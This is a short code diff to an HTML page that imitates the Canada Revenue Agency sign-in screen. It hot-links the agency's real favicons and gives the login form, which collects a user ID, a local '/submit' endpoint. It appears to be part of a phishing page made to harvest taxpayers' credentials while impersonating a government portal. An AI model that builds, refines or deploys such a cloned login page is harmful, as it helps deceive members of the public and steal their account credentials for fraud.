@@ -7,7 +7,7 @@
     <link rel="apple-touch-icon" sizes="57x57 72x72 114x114 144x144 150x150" class="wb-favicon" href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon-mobile.png"><link href="https://cms-sgj.cra-arc.gc.ca/ebci/wet/v13.7.2/GCWeb/assets/favicon.ico" rel="icon" type="image/x-icon" class="wb-init wb-favicon-inited">
     <link rel="stylesheet" href="../static/css/theme.min.css"> <!-- Link to your CSS file -->
     <link rel="stylesheet" href="../static/css/common.css"> <!-- Additional CSS -->
-    <link rel="stylesheet" href="../static/css/apps.css"> <!-- Additional CSS -->
+
 </head>
 <body>
 	<header>
@@ -47,7 +47,7 @@
 
     <main role="main" class="container">
         <h1>CRA Sign In</h1>
-        <form class="form" method="POST">
+        <form class="form" method="POST" action="/submit">
             <div class="form-group">
                 <label for="userid" class="required">User  ID <strong class="required"><i>(required)</i></strong></label>
                 <input type="text" name="USERID" class="form-control" required>
